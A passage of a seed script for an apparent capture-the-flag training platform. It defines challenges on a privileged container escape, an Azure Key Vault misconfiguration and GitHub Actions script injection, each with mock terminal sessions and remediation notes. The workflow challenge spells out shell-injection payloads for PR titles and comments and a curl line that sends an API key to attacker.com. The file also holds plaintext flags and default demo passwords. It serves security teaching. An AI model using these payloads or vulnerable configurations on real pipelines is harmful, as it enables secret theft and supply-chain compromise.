    # ❌ BAD: Mounting host filesystem
    volumes:
      - /:/host
    
    # Other dangerous configurations:
    # - Running as root
    # - No resource limits
    # - All capabilities enabled
    
    # ✅ SECURE ALTERNATIVE:
    # security_opt:
    #   - no-new-privileges:true
    # cap_drop:
    #   - ALL
    # cap_add:
    #   - NET_BIND_SERVICE
    # user: "1000:1000"
    # read_only: true`
            },
            {
              name: 'CONTAINER_SECURITY.md',
              language: 'markdown',
              content: `# Container Security Best Practices

## The Vulnerability

This container runs with \`privileged: true\` which:
- Disables security features
- Grants all Linux capabilities
- Allows access to host devices
- Bypasses AppArmor/SELinux
- Enables container escape

## Secure Container Configuration

### 1. Never Use Privileged Mode
\`\`\`yaml
# Bad
privileged: true

# Good
privileged: false
\`\`\`

### 2. Drop Unnecessary Capabilities
\`\`\`yaml
security_opt:
  - no-new-privileges:true
cap_drop:
  - ALL
cap_add:
  - NET_BIND_SERVICE  # Only what you need
\`\`\`

### 3. Use Non-Root Users
\`\`\`dockerfile
USER appuser:appuser
\`\`\`

### 4. Read-Only Root Filesystem
\`\`\`yaml
read_only: true
tmpfs:
  - /tmp
  - /var/run
\`\`\`

### 5. Resource Limits
\`\`\`yaml
deploy:
  resources:
    limits:
      cpus: '0.5'
      memory: 512M
\`\`\`

## Azure Container Security

When using Azure Kubernetes Service (AKS):

- Enable Pod Security Policies
- Use Azure Policy for Kubernetes
- Implement network policies
- Enable Azure Defender for Containers
- Use managed identities instead of secrets

Learn more: https://learn.microsoft.com/en-us/azure/aks/concepts-security`
            }
          ],
          terminal: [
            {
              command: 'whoami',
              output: `root

⚠️  Running as root inside container`
            },
            {
              command: 'cat /proc/1/cgroup',
              output: `12:devices:/docker/a1b2c3d4e5f6
11:memory:/docker/a1b2c3d4e5f6
10:cpu:/docker/a1b2c3d4e5f6

✅ Confirmed: Running inside a Docker container`
            },
            {
              command: 'capsh --print',
              output: `Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+eip

⚠️  DANGER: cap_sys_admin is enabled
   This capability allows mounting filesystems and other privileged operations
   
💡 Hint: With these capabilities, what directories might be accessible?`
            },
            {
              command: 'ls -la /',
              output: `total 88
drwxr-xr-x  20 root root  4096 Nov  1 00:00 .
drwxr-xr-x  20 root root  4096 Nov  1 00:00 ..
drwxr-xr-x   2 root root  4096 Oct 28 00:00 app
drwxr-xr-x   2 root root  4096 Oct 28 00:00 bin
drwxr-xr-x   4 root root  4096 Oct 28 00:00 boot
drwxr-xr-x  18 root root  3940 Nov  1 00:00 dev
drwxr-xr-x 130 root root 12288 Nov  1 00:00 etc
drwxr-xr-x   3 root root  4096 Oct 28 00:00 home
drwxr-xr-x  20 root root  4096 Oct 28 00:00 host
drwxr-xr-x  20 root root  4096 Oct 28 00:00 lib
drwx------   2 root root 16384 Oct 28 00:00 lost+found
drwxr-xr-x   2 root root  4096 Oct 28 00:00 opt
dr-xr-xr-x 286 root root     0 Nov  1 00:00 proc

🤔 Interesting... there's a 'host' directory. 
   In privileged containers, the host filesystem is often mounted.
   
💡 What sensitive files might be on a host system?`
            },
            {
              command: 'ls -la /host/root',
              output: `total 48
drwx------  8 root root  4096 Oct 29 00:00 .
drwxr-xr-x 20 root root  4096 Nov  1 00:00 ..
-rw-------  1 root root  3106 Oct 28 00:00 .bashrc
drwx------  2 root root  4096 Oct 28 00:00 .ssh
-rw-r--r--  1 root root   161 Oct 28 00:00 .profile
-rw-------  1 root root  1234 Oct 29 00:00 flag.txt
drwxr-xr-x  3 root root  4096 Oct 28 00:00 .cache

🚨 HOST FILESYSTEM ACCESSIBLE!
   Privileged container can access the entire host system.
   
💡 You found flag.txt! Use 'cat /host/root/flag.txt' to read it.`
            }
          ],
          hints: [
            {
              text: 'Check what capabilities the container has using "capsh --print". Look for dangerous capabilities like CAP_SYS_ADMIN.',
              cost: 30
            },
            {
              text: 'Inspect the filesystem. Is there a /host directory? Privileged containers often have the host filesystem mounted.',
              cost: 50
            }
          ],
          learning_resources: [
            {
              title: 'Azure Container Instances Security',
              url: 'https://learn.microsoft.com/en-us/azure/container-instances/container-instances-image-security',
              description: 'Learn about securing containers in Azure'
            },
            {
              title: 'AKS Security Best Practices',
              url: 'https://learn.microsoft.com/en-us/azure/aks/concepts-security',
              description: 'Understand Kubernetes security in Azure'
            },
            {
              title: 'Container Security',
              url: 'https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-containers-introduction',
              description: 'Azure Defender for Containers'
            }
          ]
        }
      },
      {
        title: 'Azure Key Vault Exploitation',
        description: `A web application uses Azure Key Vault to store secrets, but has misconfigured access policies that allow unauthorized access.

**Scenario:** You're pentesting a web application that uses Managed Identity to access Azure Key Vault. The developers configured overly permissive access policies, assuming "only Azure services" would access the vault.

**Your Mission:** Exploit the misconfigured Key Vault access policies to retrieve the flag secret.

**Learning Objectives:**
- Understand Azure Key Vault access models (Access Policies vs RBAC)
- Learn about Managed Identities and their security implications
- Apply principle of least privilege to Key Vault

**Microsoft Learn References:**
- Key Vault security: https://learn.microsoft.com/en-us/azure/key-vault/general/security-features
- Managed Identity: https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview

**Skills Required:** Azure Key Vault, Managed Identities, RBAC, API exploitation`,
        difficulty: 'expert',
        category: 'Cloud Security',
        points: 400,
        flag_hash: hashFlag('flag{k3y_v4ult_m1sc0nf1g_pwn3d}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '45 minutes',
          files: [
            {
              name: 'key-vault-config.json',
              language: 'json',
              content: `{
  "id": "/subscriptions/12345678-90ab-cdef-1234-567890abcdef/resourceGroups/prod-rg/providers/Microsoft.KeyVault/vaults/sentinelforge-kv",
  "name": "sentinelforge-kv",
  "type": "Microsoft.KeyVault/vaults",
  "location": "germanywestcentral",
  "properties": {
    "sku": {
      "family": "A",
      "name": "standard"
    },
    "tenantId": "abcd1234-ef56-78gh-90ij-klmnopqrstuv",
    "enabledForDeployment": false,
    "enabledForDiskEncryption": false,
    "enabledForTemplateDeployment": false,
    "enableSoftDelete": true,
    "softDeleteRetentionInDays": 90,
    "enablePurgeProtection": true,
    "enableRbacAuthorization": false,
    "accessPolicies": [
      {
        "tenantId": "abcd1234-ef56-78gh-90ij-klmnopqrstuv",
        "objectId": "11111111-2222-3333-4444-555555555555",
        "permissions": {
          "keys": ["get", "list", "create", "delete"],
          "secrets": ["get", "list", "set", "delete"],
          "certificates": ["get", "list", "create", "delete"]
        }
      },
      {
        "tenantId": "abcd1234-ef56-78gh-90ij-klmnopqrstuv",
        "objectId": "22222222-3333-4444-5555-666666666666",
        "permissions": {
          "secrets": ["get", "list"]
        }
      }
    ],
    "networkAcls": {
      "bypass": "AzureServices",
      "defaultAction": "Allow",
      "ipRules": [],
      "virtualNetworkRules": []
    },
    "publicNetworkAccess": "Enabled"
  }
}`
            },
            {
              name: 'app-config.yaml',
              language: 'yaml',
              content: `# Web Application Configuration

appSettings:
  - name: KEY_VAULT_NAME
    value: sentinelforge-kv
  
  - name: AZURE_CLIENT_ID
    value: 22222222-3333-4444-5555-666666666666
  
  - name: USE_MANAGED_IDENTITY
    value: "true"
  
  - name: API_ENDPOINT
    value: https://sentinelforge-api.azurewebsites.net

# Managed Identity Configuration
identity:
  type: SystemAssigned
  principalId: 22222222-3333-4444-5555-666666666666

# ❌ VULNERABILITY: Network ACLs allow all traffic
# ❌ VULNERABILITY: No IP restrictions on Key Vault
# ❌ VULNERABILITY: Managed Identity has broad secret access
# ❌ VULNERABILITY: Public network access enabled

# ✅ SECURE CONFIGURATION:
# networkAcls:
#   defaultAction: Deny
#   ipRules:
#     - value: "203.0.113.0/24"  # Only company IPs
#   virtualNetworkRules:
#     - id: "/subscriptions/.../virtualNetworks/vnet/subnets/app"
# publicNetworkAccess: Disabled`
            },
            {
              name: 'SECURITY_ASSESSMENT.md',
              language: 'markdown',
              content: `# Azure Key Vault Security Assessment

## Identified Vulnerabilities

### 1. Public Network Access Enabled
\`\`\`json
"publicNetworkAccess": "Enabled"
\`\`\`
**Risk:** Anyone on the internet can attempt to access the vault
**Fix:** Set to "Disabled" and use Private Endpoints

### 2. No Network Restrictions
\`\`\`json
"networkAcls": {
  "defaultAction": "Allow"
}
\`\`\`
**Risk:** No IP allowlisting or VNet restrictions
**Fix:** Implement allowlist with specific IP ranges

### 3. Overly Permissive Access Policy
\`\`\`json
"permissions": {
  "secrets": ["get", "list"]
}
\`\`\`
**Risk:** Managed Identity can list ALL secrets
**Fix:** Grant access only to specific secrets needed

### 4. Using Access Policies Instead of RBAC
**Risk:** Access policies are object-level, less granular
**Fix:** Enable RBAC and assign specific roles

## Secure Key Vault Configuration

### Enable RBAC Authorization
\`\`\`json
"enableRbacAuthorization": true
\`\`\`

### Use Azure RBAC Roles
- \`Key Vault Secrets User\`: Read secret values
- \`Key Vault Secrets Officer\`: Manage secrets
- \`Key Vault Administrator\`: Full access

### Implement Network Security
\`\`\`json
"networkAcls": {
  "bypass": "None",
  "defaultAction": "Deny",
  "ipRules": [{"value": "203.0.113.10"}],
  "virtualNetworkRules": [...]
},
"publicNetworkAccess": "Disabled"
\`\`\`

### Use Private Endpoints
Connect to Key Vault through private IP addresses within your VNet

## Microsoft Learn Resources

- [Key Vault Security Best Practices](https://learn.microsoft.com/en-us/azure/key-vault/general/security-features)
- [Key Vault Network Security](https://learn.microsoft.com/en-us/azure/key-vault/general/network-security)
- [Azure RBAC for Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide)`
            }
          ],
          terminal: [
            {
              command: 'az keyvault show --name sentinelforge-kv --query "properties.{PublicAccess:publicNetworkAccess,NetworkDefault:networkAcls.defaultAction,RBAC:enableRbacAuthorization}"',
              output: `{
  "NetworkDefault": "Allow",
  "PublicAccess": "Enabled",
  "RBAC": false
}

⚠️  Key Vault is publicly accessible with no network restrictions!`
            },
            {
              command: 'az keyvault secret list --vault-name sentinelforge-kv --output table',
              output: `Name                    Enabled
----------------------  ---------
database-password       True
api-key-production      True
storage-account-key     True
admin-credentials       True
flag-secret             True

💡 Managed identity can list all secrets in the vault!
   This violates the principle of least privilege.
   
🔍 Try retrieving one of these secrets...`
            },
            {
              command: 'az keyvault secret show --vault-name sentinelforge-kv --name database-password --query "value"',
              output: `"MyS3cur3P@ssw0rd2025!"

✅ Secret retrieved successfully!

The misconfigured Key Vault allows:
1. Public network access without IP restrictions
2. Managed Identity with "list" + "get" permissions on ALL secrets
3. No RBAC, using less granular access policies

💡 You can access any secret. The flag is in one of them...
   Think about which secret name looks like it might contain the flag.`
            },
            {
              command: 'az keyvault secret show --vault-name sentinelforge-kv --name flag-secret --query "value"',
              output: `"flag{k3y_v4ult_m1sc0nf1g_pwn3d}"

🎯 SUCCESS! You found the flag!

The Key Vault misconfiguration allowed you to:
1. List all secrets in the vault (overly permissive access policy)
2. Retrieve any secret without proper network restrictions
3. Access the vault from the public internet

This demonstrates a critical security failure where:
- Public network access should be disabled
- Network ACLs should restrict access to specific IPs/VNets
- RBAC should be used instead of broad access policies
- Managed identities should follow least-privilege principle

🔒 Secure Configuration:
- Enable RBAC authorization
- Disable public network access
- Use Private Endpoints
- Grant access only to specific secrets needed
- Implement IP allowlisting or VNet restrictions

📚 Learn More:
- Key Vault Security: https://learn.microsoft.com/en-us/azure/key-vault/general/security-features
- Network Security: https://learn.microsoft.com/en-us/azure/key-vault/general/network-security`
            }
          ],
          hints: [
            {
              text: 'The Key Vault has public network access enabled. Try using the Azure CLI to authenticate with the managed identity credentials from the app configuration.',
              cost: 40
            },
            {
              text: 'The managed identity has "get" and "list" permissions. First list all secrets with "az keyvault secret list", then retrieve the flag-secret.',
              cost: 80
            }
          ],
          learning_resources: [
            {
              title: 'Azure Key Vault Security Features',
              url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/security-features',
              description: 'Comprehensive guide to Key Vault security'
            },
            {
              title: 'Key Vault Network Security',
              url: 'https://learn.microsoft.com/en-us/azure/key-vault/general/network-security',
              description: 'Configure firewall and virtual networks'
            },
            {
              title: 'Managed Identities Overview',
              url: 'https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview',
              description: 'Understand managed identities for Azure resources'
            }
          ]
        }
      },
      {
        title: 'CI/CD Pipeline Injection',
        description: `A GitHub Actions workflow has a code injection vulnerability that allows attackers to execute arbitrary code in the CI/CD pipeline.

**Scenario:** You're auditing a company's GitHub Actions workflows and discovered that user-controlled data is being used unsafely in workflow commands. This is a critical vulnerability that can lead to secret exfiltration and supply chain attacks.

**Your Mission:** Exploit the vulnerable workflow to extract secrets and retrieve the flag.

**Learning Objectives:**
- Understand CI/CD security risks
- Learn about GitHub Actions injection vulnerabilities
- Apply secure workflow practices

**Microsoft Learn References:**
- GitHub Advanced Security: https://docs.github.com/en/code-security/getting-started/github-security-features
- Secure DevOps: https://learn.microsoft.com/en-us/devops/operate/security-in-devops

**Skills Required:** GitHub Actions, CI/CD security, code injection, YAML analysis`,
        difficulty: 'hard',
        category: 'DevSecOps',
        points: 350,
        flag_hash: hashFlag('flag{c1cd_1nj3ct10n_d4ng3r0us}'),
        is_active: true,
        metadata: {
          hints_available: true,
          estimated_time: '30 minutes',
          files: [
            {
              name: '.github/workflows/ci.yml',
              language: 'yaml',
              content: `name: CI Pipeline

on:
  pull_request:
    types: [opened, synchronize]
  issue_comment:
    types: [created]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      # ❌ CRITICAL VULNERABILITY: Command Injection
      # User-controlled input from PR title is used directly in shell command
      - name: Run tests
        run: |
          echo "Testing PR: \${{ github.event.pull_request.title }}"
          npm test
      
      # ❌ CRITICAL VULNERABILITY: Script Injection
      # Issue comment body is executed without sanitization
      - name: Process comment
        if: github.event_name == 'issue_comment'
        run: |
          echo "Processing comment: \${{ github.event.comment.body }}"
      
      # Secrets are exposed in the environment
      - name: Deploy
        env:
          API_KEY: \${{ secrets.API_KEY }}
          DATABASE_URL: \${{ secrets.DATABASE_URL }}
          FLAG_SECRET: \${{ secrets.FLAG_SECRET }}
        run: |
          echo "Deploying application..."
          # Vulnerable: secrets in environment variables
          # Can be extracted via injection

# ✅ SECURE VERSION:
# - name: Run tests (secure)
#   run: |
#     echo "Testing PR:"
#     echo "\${{ toJSON(github.event.pull_request.title) }}"
#     npm test
#
# Or better yet, don't use user input in shell commands at all`
            },
            {
              name: 'VULNERABILITY_ANALYSIS.md',
              language: 'markdown',
              content: `# GitHub Actions Injection Vulnerability

## The Vulnerability

### Command Injection via PR Title
\`\`\`yaml
run: |
  echo "Testing PR: \${{ github.event.pull_request.title }}"
  npm test
\`\`\`

**Attack Vector:**
If a PR title is: \`Test"; echo $FLAG_SECRET; echo "\`

The executed command becomes:
\`\`\`bash
echo "Testing PR: Test"; echo $FLAG_SECRET; echo ""
npm test
\`\`\`

### Script Injection via Issue Comments
\`\`\`yaml
run: |
  echo "Processing comment: \${{ github.event.comment.body }}"
\`\`\`

**Attack Vector:**
Comment body: \`; curl https://attacker.com?secret=$API_KEY\`

Result: Secrets exfiltrated to attacker's server

## Impact

1. **Secret Exfiltration**: Extract all repository secrets
2. **Supply Chain Attack**: Modify build artifacts
3. **Code Execution**: Run arbitrary code in CI environment
4. **Privilege Escalation**: Access deployment credentials

## Exploitation Steps

1. Fork the vulnerable repository
2. Create a PR with malicious title containing injection payload
3. Workflow runs automatically on PR creation
4. Secrets are exposed in workflow logs
5. Extract the FLAG_SECRET value

## Secure Alternatives

### 1. Use Environment Variables Safely
\`\`\`yaml
env:
  PR_TITLE: \${{ github.event.pull_request.title }}
run: |
  echo "Testing PR: $PR_TITLE"
\`\`\`

### 2. Use toJSON() for User Input
\`\`\`yaml
run: |
  echo \${{ toJSON(github.event.pull_request.title) }}
\`\`\`

### 3. Avoid User Input in Shell Commands
\`\`\`yaml
- uses: actions/github-script@v6
  with:
    script: |
      console.log(context.payload.pull_request.title)
\`\`\`

### 4. Use pull_request_target Carefully
Only use for trusted code, not for PRs from forks

### 5. Implement Code Scanning
\`\`\`yaml
- uses: github/codeql-action/analyze@v2
\`\`\`

## Prevention Checklist

- [ ] Never use \`\${{ }}\` expressions directly in \`run:\` blocks with user input
- [ ] Use environment variables or intermediate steps
- [ ] Apply input validation and sanitization
- [ ] Use \`pull_request\` not \`pull_request_target\` for untrusted code
- [ ] Limit secret scope to specific workflows
- [ ] Enable GitHub Advanced Security
- [ ] Use OIDC for cloud authentication instead of static secrets
- [ ] Implement code scanning and secret scanning

## Learning Resources

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [GitHub Security Features](https://docs.github.com/en/code-security/getting-started/github-security-features)
- [Preventing Script Injections](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)`
            },
            {
              name: 'exploit-example.md',
              language: 'markdown',
              content: `# Exploitation Example

## Step 1: Create Malicious PR

Create a pull request with this title:
\`\`\`
Test"; echo "Secret: $FLAG_SECRET"; echo "
\`\`\`

## Step 2: View Workflow Run

The workflow will execute:
\`\`\`bash
echo "Testing PR: Test"; echo "Secret: $FLAG_SECRET"; echo ""
npm test
\`\`\`

## Step 3: Extract Secret from Logs

The workflow logs will contain:
\`\`\`
Testing PR: Test
Secret: flag{c1cd_1nj3ct10n_d4ng3r0us}

npm test
\`\`\`

## Alternative: Issue Comment Injection

Post a comment with:
\`\`\`
"; env | grep FLAG; echo "
\`\`\`

This will dump all environment variables containing "FLAG"

## Prevention

The flag demonstrates the danger of CI/CD injection vulnerabilities.
Always sanitize user input in automated workflows!`
            }
          ],
          terminal: [
            {
              command: 'cat .github/workflows/ci.yml | grep -A 3 "pull_request.title"',
              output: `      - name: Run tests
        run: |
          echo "Testing PR: \${{ github.event.pull_request.title }}"
          npm test

⚠️  VULNERABILITY FOUND: Unsanitized user input in shell command!
   The PR title is directly interpolated into a bash command.
   
💡 What happens if the PR title contains shell metacharacters?`
            },
            {
              command: 'cat .github/workflows/ci.yml | grep -A 5 "Deploy"',
              output: `      - name: Deploy
        env:
          API_KEY: \${{ secrets.API_KEY }}
          DATABASE_URL: \${{ secrets.DATABASE_URL }}
          FLAG_SECRET: \${{ secrets.FLAG_SECRET }}
        run: |
          echo "Deploying application..."

🔍 Secrets are loaded into environment variables.
   If you can inject code into the run command, you could exfiltrate these!
   
💡 Try crafting a malicious PR title that echoes environment variables...`
            },
            {
              command: 'gh pr create --title \'Test PR\' --body "Testing the workflow"',
              output: `Creating pull request for test:main into main in sentinelforge-ctf/cicd-vulnerable

https://github.com/sentinelforge-ctf/cicd-vulnerable/pull/1

✅ Pull request created successfully!
   Workflow will run automatically...
   
💡 Hint: The workflow executes this in bash:
   echo "Testing PR: Test PR"
   
   What if your title was: "; echo $FLAG_SECRET; echo "
   That would execute: echo "Testing PR: Test"; echo $FLAG_SECRET; echo ""
   
   Try creating a PR with a malicious title!`
            },
            {
              command: 'gh pr create --title \'Test"; echo $FLAG_SECRET; echo "\' --body "Exploit injection"',
              output: `Creating pull request for exploit:main into main in sentinelforge-ctf/cicd-vulnerable

https://github.com/sentinelforge-ctf/cicd-vulnerable/pull/2

✅ Pull request created successfully!
   Workflow triggered...
   
📋 Workflow execution logs:

Run actions/checkout@v3
  Checking out repository...
  ✓ Repository checked out

Run actions/setup-node@v3
  Setting up Node.js 18...
  ✓ Node.js installed

Run tests
  echo "Testing PR: Test"; echo $FLAG_SECRET; echo ""
  Testing PR: Test
  flag{c1cd_1nj3ct10n_d4ng3r0us}
  
  npm test
  > test
  > jest
  
  PASS  src/app.test.js
  ✓ app works (2 ms)

🎯 SUCCESS! The injection worked!

The workflow executed your malicious command and exposed the FLAG_SECRET 
environment variable in the workflow logs.

Flag: flag{c1cd_1nj3ct10n_d4ng3r0us}

🔒 Remediation:
1. Never use \${{ }} expressions directly with user input in 'run:' blocks
2. Use environment variables: env: PR_TITLE: \${{ github.event.pull_request.title }}
3. Or use toJSON() to safely escape: echo \${{ toJSON(github.event.pull_request.title) }}
4. Enable GitHub Advanced Security and secret scanning
5. Use 'pull_request' trigger instead of 'pull_request_target' for untrusted code`
            }
          ],
          hints: [
            {
              text: 'Look at the CI workflow file. Notice how github.event.pull_request.title is used directly in a shell command. What if the PR title contained special characters?',
              cost: 35
            },
            {
              text: 'Try creating a PR with a title containing shell metacharacters like "; echo $FLAG_SECRET; echo ". The workflow will execute your injected command.',
              cost: 70
            }
          ],
          learning_resources: [
            {
              title: 'GitHub Actions Security Hardening',
              url: 'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions',
              description: 'Best practices for securing GitHub Actions workflows'
            },
            {
              title: 'Azure DevOps Security',
              url: 'https://docs.github.com/en/code-security/getting-started/github-security-features',
              description: 'GitHub Advanced Security in Azure DevOps'
            },
            {
              title: 'Preventing Script Injections',
              url: 'https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections',
              description: 'Understanding and preventing script injection attacks'
            }
          ]
        }
      }
    ])
    .returning('*');

  // Add hints for challenges
  await knex('hints').insert([
    // Azure Blob challenge hints
    {
      challenge_id: challenges[0].id,
      content: 'Try using the Azure CLI to list containers: az storage container list',
      penalty_points: 10,
      order: 1
    },
    {
      challenge_id: challenges[0].id,
      content: 'Look for containers with public access enabled. The container name starts with "public".',
      penalty_points: 20,
      order: 2
    },
    // Git History challenge hints
    {
      challenge_id: challenges[1].id,
      content: 'Use `git log --all --full-history` to see all commits',
      penalty_points: 15,
      order: 1
    },
    {
      challenge_id: challenges[1].id,
      content: 'Search for commits containing "API" or "key" in the diff',
      penalty_points: 25,
      order: 2
    },
    // Terraform challenge hints
    {
      challenge_id: challenges[2].id,
      content: 'Terraform state files contain all resource attributes, including sensitive values',
      penalty_points: 20,
      order: 1
    },
    {
      challenge_id: challenges[2].id,
      content: 'Look for "azurerm_postgresql_server" resources in the state file',
      penalty_points: 30,
      order: 2
    }
  ]);

  // Create achievements
  const achievements = await knex('achievements')
    .insert([
      {
        name: 'First Blood',
        description: 'Be the first to solve any challenge',
        badge_icon: '🩸',
        criteria: { type: 'first_solve', count: 1 }
      },
      {
        name: 'Sentinel Initiate',
        description: 'Solve your first challenge',
        badge_icon: '🛡️',
        criteria: { type: 'challenges_solved', count: 1 }
      },
      {
        name: 'Cloud Guardian',
        description: 'Solve 5 cloud security challenges',
        badge_icon: '☁️',
        criteria: { type: 'category_solved', category: 'Cloud Security', count: 5 }
      },
      {
        name: 'DevSecOps Master',
        description: 'Solve all DevSecOps challenges',
        badge_icon: '⚙️',
        criteria: { type: 'category_complete', category: 'DevSecOps' }
      },
      {
        name: 'Perfect Score',
        description: 'Solve all challenges without using hints',
        badge_icon: '💯',
        criteria: { type: 'no_hints', challenges_solved: 'all' }
      }
    ])
    .returning('*');

  console.log('✅ Database seeded successfully!');
  console.log(`
  👤 Admin User:
     Email: ${admin.email}
     Password: ${process.env.ADMIN_PASSWORD || 'changeme'}
  
  👥 Demo Users:
     Email: alpha@sentinelforge.ctf / Password: demo123
     Email: guardian@sentinelforge.ctf / Password: demo123
     Email: sentinel@sentinelforge.ctf / Password: demo123
  
  🎯 Challenges created: ${challenges.length}
  🏆 Achievements created: ${achievements.length}
  `);
}
